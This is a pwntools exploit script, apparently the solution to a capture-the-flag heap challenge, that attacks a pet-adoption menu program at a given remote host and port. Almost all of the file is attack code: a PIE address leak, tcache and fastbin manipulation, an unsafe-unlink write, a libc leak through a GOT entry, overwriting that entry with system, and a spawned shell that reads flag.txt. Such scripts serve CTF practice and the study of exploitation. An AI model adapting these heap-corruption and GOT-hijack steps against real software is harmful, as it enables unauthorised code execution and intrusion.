from pwn import *
from time import sleep

############## setup ###############
context.arch = "amd64"
exe = ELF("./main")
libc = exe.libc
host, port = "20.224.160.150", 12001 
if args.REMOTE:
    p = remote(host,port)
elif args.GDB:
    p = gdb.debug([exe.path])
else:
    p = process([exe.path])
#####################################

#functions def
def exit():
    p.sendlineafter(b'> ', b'5')

def view():
    p.sendlineafter(b'> ', b'4')

def adopt(idx, size, name):
    p.sendlineafter(b'> ', b'1')
    p.sendline(idx)
    p.sendlineafter(b'size: ', size)
    p.sendafter(b'Pet name: ', name)

def ret(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendline(idx)

def rename(idx, newname):
    p.sendlineafter(b'> ', b'3')
    sleep(0.5)
    p.sendline(idx)
    sleep(0.5)
    p.send(newname)

#pie_leak 
adopt(b'19', b'41', b'B'*41)
view()
p.recvuntil(b'B'*41)
pie_leak = int(p.recvline().strip(), 16)
pie = pie_leak - 0x11d9
log.info(hex(pie))
#dup + unsafe_unlink
for i in range(0,7):
    adopt(str(i).encode(), b'40', b'grgr')

for i in range(7,14):
    adopt(str(i).encode(), b'250', b'grgr')

adopt(b'14', b'40', b'grgr')
adopt(b'15', b'250', b'grgr')

for i in range(7):
    ret(str(i).encode())

for i in range(7,14):
    ret(str(i).encode())

ret(b'14')
adopt(b'16', b'1500', b'ourbigchucksochunksatfastbinsgetmovedtolargerbins')
ret(b'14')
unlink_target = pie + 0x4130

for i in range(0,7):
    adopt(str(i).encode(), b'40', b'grgr')

adopt(b'14', b'40', p64(0)+p64(0x21)+p64(unlink_target-0x18)+p64(unlink_target-0x10)+p64(0x20))
ret(b'15')

puts_plt = pie + 0x1040
memset_got = pie + 0x4028

adopt(b'11', b'50', b'grgr')
adopt(b'12', b'50', b'sh\0')
rename(b'14', p64(memset_got))

view()
p.recvuntil(b"[11] ")
libc.address = u64(p.recvline().strip().ljust(8, b'\x00')) - 0x199340
log.info(hex(libc.address))
rename(b'11', p64(libc.address + 0x58751)) #system@libc
ret(b'12')
p.sendline(b"cat flag.txt")

p.interactive()
